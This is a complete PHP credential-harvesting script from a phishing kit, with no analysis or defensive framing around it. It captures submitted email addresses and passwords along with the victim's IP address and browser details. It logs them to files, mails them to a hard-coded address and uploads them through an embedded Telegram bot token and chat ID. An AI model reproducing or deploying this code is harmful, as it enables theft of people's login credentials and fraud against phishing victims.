<?php
error_reporting(0);
$myemail = "turnner@hi2.in";
$telegram_id = "5267319193:AAGGlOe8n97aiQz4GB4oF6ElR0gITSQt1Vo";
$chat_id = 407547624;

//g_captcha
$g_key = '6LenI20fAAAAAG-aRaPI0v0gFssEYANSb_Sgx8-R';


if($_POST["ai"] != "" and $_POST["pr"] != "") {
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Mail Info-----------------------\n";
$message .= "Email: ".$_POST['ai']."\n";
$message .= "Password: ".$_POST['pr']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
$subject = "Mailer";

$randomNumber = rand(10000,1000000);

$file = "log_file.txt";
$open = fopen($file, "a");
fwrite($open, $message."\n");
fclose($open);


$files = "new_Fish_".$randomNumber.".txt";
$open = fopen($files, "a");
fwrite($open, $message."\n");
fclose($open);




mail($myemail, $subject, $message);   
$ramfile = "new_Fish_".$randomNumber.".txt";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".$telegram_id."/sendDocument?chat_id=" . $chat_id);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
$finfo = finfo_file(finfo_open(FILEINFO_MIME_TYPE), $ramfile);
$cFile = new CURLFile($ramfile, $finfo);
    curl_setopt($ch, CURLOPT_POSTFIELDS, [
        "document" => $cFile
    ]);     

    $result = curl_exec($ch);
    
unlink($ramfile);





}

?>